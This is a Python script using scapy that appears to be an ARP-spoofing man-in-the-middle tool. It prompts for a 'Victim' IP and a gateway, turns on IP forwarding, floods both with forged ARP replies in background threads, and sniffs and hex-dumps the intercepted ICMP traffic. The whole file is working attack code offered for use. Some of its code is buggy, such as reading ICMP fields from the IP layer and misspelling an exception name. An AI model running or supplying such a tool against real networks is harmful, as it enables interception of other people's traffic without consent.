import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import threading
from termcolor import colored

os.system("clear")

print("""
            .____________     _____ __________ 
            |   \_   ___ \   /       ______   )
            |   /    \  \/  /  \ /  \|     ___)
            |   \     \____/    Y    \    |    
            |___|\______  /\____|__  /____|    
                        \/         \/          
""")

os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') #Ensure the victim recieves packets by forwarding them

VIP = input("\nVictim: ")
GW = input("Gateway: ")
IFACE = input("Interface: ")

str(GW)
str(VIP)
str(IFACE)

def pkthandler(pkt):
      try:
         ip = pkt[IP]
      except IndexError:
         pass

      try:
         src = ip.src
         dst = ip.dst
      except UnboundLocalError:
         pass

      if pkt.haslayer(ICMP):
         icmp = pkt[ICMP]

         print("--------------------------------------------------------\n\n")
         print("                     .:{}:.                            ".format(colored('ICMP','red')))
         print("                                                          ")
         print("  \033[1;36mSource IP:\033[00m {} \033[1;36mDestination IP:\033[00m {}".format(src, dst))
         print("  \033[1;36mType Of Message:\033[00m {}".format(ip.type))
         print("  \033[1;36mCode:\033[00m {}".format(ip.code))
         print("  \033[1;36mChecksum:\033[00m {}".format(ip.chksum))
         print("  \033[1;36mIdentifier:\033[00m {}".format(ip.id))
         print("  \033[1;36mSequence Number:\033[00m {}".format(ip.seq))
         print("  \033[1;36mTs Origin:\033[00m {}".format(ip.ts_ori))
         print("  \033[1;36mTs Rx:\033[00m {}".format(ip.ts_rx))
         print("  \033[1;36mTs Tx:\033[00m {}".format(ip.ts_tx))
         print("  \033[1;36mGateway:\033[00m {}".format(ip.gw))
         print("  \033[1;36mPtr:\033[00m {}".format(ip.ptr))
         print("  \033[1;36mReserved:\033[00m {}".format(ip.reserved))
         print("  \033[1;36mReserved:\033[00m {}".format(ip.reserved))
         print("  \033[1;36mAddress Mask:\033[00m {}".format(ip.addr_mask))
         print("  \033[1;36mUnused:\033[00m {}".format(ip.unused))
         

         print(" ")
         print(" ")
         hexdump(pkt)

def v_poison():
   v = ARP(pdst=VIP, psrc=GW,)
   while True:
      try:   
         send(v,verbose=0,inter=1,loop=1)
      except KeyboardInterupt:                     # Functions constructing and sending the ARP packets
         sys.exit(1)

def gw_poison():
   gw = ARP(pdst=GW, psrc=VIP)
   while True:
      try:
         send(gw,verbose=0,inter=1,loop=1)
      except KeyboardInterupt:
         sys.exit(1)

def format_muti_lines(prefix, string, size=80):
  size -= len(prefix)
  if isinstance(string, bytes):
     string = ''.join(r'\x{:02x}'.format(byte) for byte in string)
     if size % 2:
        size -= 1
  return '\n'.join([prefix + line for line in textwrap.wrap(string, size)])
 
vthread = []
gwthread = []  
 
while True:     # Threads
  vpoison = threading.Thread(target=v_poison)
  vpoison.setDaemon(True)
  vthread.append(vpoison)
  vpoison.start()        
       
  gwpoison = threading.Thread(target=gw_poison)
  gwpoison.setDaemon(True)
  gwthread.append(gwpoison)
  gwpoison.start()
  
  try:
     pkt = sniff(iface=str(IFACE),prn=pkthandler)
  except KeyboardInterrupt:
     os.system("{ cd ..; python3 net.py; }")
     exit(0)
if __name__ == "__main__":
   ICMP()